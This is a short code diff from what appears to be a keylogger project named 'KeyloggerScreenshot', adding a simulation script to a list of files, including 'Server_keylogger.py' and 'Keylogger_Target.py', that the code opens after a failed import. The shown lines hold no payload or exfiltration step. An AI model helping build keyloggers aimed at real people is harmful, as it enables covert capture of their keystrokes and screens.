@@ -3,7 +3,7 @@ try:
     import pyautogui as pg
 
 except KeyError:
-    files = ["Server_keylogger.py", "Keylogger_Target.py"]
+    files = ["Simulation_code.py","Server_keylogger.py", "Keylogger_Target.py"]
     for this_file in files:
         os.chdir("KeyloggerScreenshot")
         with open(this_file, "r+") as file:
